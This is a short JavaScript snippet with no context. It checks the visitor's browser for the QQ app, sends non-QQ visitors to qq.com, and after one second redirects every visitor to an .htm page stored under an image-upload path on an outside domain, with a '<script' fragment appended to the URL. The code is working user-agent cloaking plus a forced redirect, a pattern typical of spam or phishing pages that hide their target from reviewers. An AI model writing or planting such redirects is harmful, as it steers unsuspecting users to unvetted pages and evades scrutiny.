function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://ttuu.6pian.cn/upload-img/2024/01/05/d0b1ea1660f59ce0037230bc2e7de5fe.htm' + '?' + timestamp + '%3Cscript';
    location.href = url;
}, 1000);
